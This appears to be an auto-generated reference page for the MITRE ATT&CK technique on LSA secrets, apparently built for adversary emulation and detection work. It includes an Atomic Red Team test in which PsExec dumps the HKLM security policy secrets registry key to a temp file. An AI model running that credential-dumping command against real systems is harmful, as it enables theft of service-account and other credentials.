
# LSA Secrets

## Description

### MITRE Description

> Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)

[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1003/004

## Potential Commands

```
PathToAtomicsFolder\T1003.004\bin\PsExec.exe -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets
```

## Commands Dataset

```
[{'command': 'PathToAtomicsFolder\\T1003.004\\bin\\PsExec.exe -accepteula -s '
             'reg save HKLM\\security\\policy\\secrets %temp%\\secrets',
  'name': None,
  'source': 'atomics/T1003.004/T1003.004.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - OS Credential Dumping: LSA Secrets': {'atomic_tests': [{'auto_generated_guid': '55295ab0-a703-433b-9ca4-ae13807de12f',
                                                                                  'dependencies': [{'description': 'PsExec '
                                                                                                                   'from '
                                                                                                                   'Sysinternals '
                                                                                                                   'must '
                                                                                                                   'exist '
                                                                                                                   'on '
                                                                                                                   'disk '
                                                                                                                   'at '
                                                                                                                   'specified '
                                                                                                                   'location '
                                                                                                                   '(#{psexec_exe})',
                                                                                                    'get_prereq_command': 'Invoke-WebRequest '
                                                                                                                          '"https://download.sysinternals.com/files/PSTools.zip" '
                                                                                                                          '-OutFile '
                                                                                                                          '"$env:TEMP\\PSTools.zip"\n'
                                                                                                                          'Expand-Archive '
                                                                                                                          '$env:TEMP\\PSTools.zip '
                                                                                                                          '$env:TEMP\\PSTools '
                                                                                                                          '-Force\n'
                                                                                                                          'New-Item '
                                                                                                                          '-ItemType '
                                                                                                                          'Directory '
                                                                                                                          '(Split-Path '
                                                                                                                          '#{psexec_exe}) '
                                                                                                                          '-Force '
                                                                                                                          '| '
                                                                                                                          'Out-Null\n'
                                                                                                                          'Copy-Item '
                                                                                                                          '$env:TEMP\\PSTools\\PsExec.exe '
                                                                                                                          '#{psexec_exe} '
                                                                                                                          '-Force',
                                                                                                    'prereq_command': 'if '
                                                                                                                      '(Test-Path '
                                                                                                                      '#{psexec_exe}) '
                                                                                                                      '{exit '
                                                                                                                      '0} '
                                                                                                                      'else '
                                                                                                                      '{exit '
                                                                                                                      '1}'}],
                                                                                  'dependency_executor_name': 'powershell',
                                                                                  'description': 'Dump '
                                                                                                 'secrets '
                                                                                                 'key '
                                                                                                 'from '
                                                                                                 'Windows '
                                                                                                 'registry\n'
                                                                                                 'When '
                                                                                                 'successful, '
                                                                                                 'the '
                                                                                                 'dumped '
                                                                                                 'file '
                                                                                                 'will '
                                                                                                 'be '
                                                                                                 'written '
                                                                                                 'to '
                                                                                                 '$env:Temp\\secrets.\n'
                                                                                                 'Attackers '
                                                                                                 'may '
                                                                                                 'use '
                                                                                                 'the '
                                                                                                 'secrets '
                                                                                                 'key '
                                                                                                 'to '
                                                                                                 'assist '
                                                                                                 'with '
                                                                                                 'extracting '
                                                                                                 'passwords '
                                                                                                 'and '
                                                                                                 'enumerating '
                                                                                                 'other '
                                                                                                 'sensitive '
                                                                                                 'system '
                                                                                                 'information.\n'
                                                                                                 'https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n',
                                                                                  'executor': {'cleanup_command': 'del '
                                                                                                                  '%temp%\\secrets '
                                                                                                                  '>nul '
                                                                                                                  '2> '
                                                                                                                  'nul',
                                                                                               'command': '#{psexec_exe} '
                                                                                                          '-accepteula '
                                                                                                          '-s '
                                                                                                          'reg '
                                                                                                          'save '
                                                                                                          'HKLM\\security\\policy\\secrets '
                                                                                                          '%temp%\\secrets',
                                                                                               'elevation_required': True,
                                                                                               'name': 'command_prompt'},
                                                                                  'input_arguments': {'psexec_exe': {'default': 'PathToAtomicsFolder\\T1003.004\\bin\\PsExec.exe',
                                                                                                                     'description': 'Path '
                                                                                                                                    'to '
                                                                                                                                    'PsExec '
                                                                                                                                    'executable',
                                                                                                                     'type': 'Path'}},
                                                                                  'name': 'Dumping '
                                                                                          'LSA '
                                                                                          'Secrets',
                                                                                  'supported_platforms': ['windows']}],
                                                                'attack_technique': 'T1003.004',
                                                                'display_name': 'OS '
                                                                                'Credential '
                                                                                'Dumping: '
                                                                                'LSA '
                                                                                'Secrets'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [User Training](../mitigations/User-Training.md)

* [Password Policies](../mitigations/Password-Policies.md)
    
* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    

# Actors


* [Threat Group-3390](../actors/Threat-Group-3390.md)

* [APT33](../actors/APT33.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [Leafminer](../actors/Leafminer.md)
    
* [menuPass](../actors/menuPass.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [OilRig](../actors/OilRig.md)
    
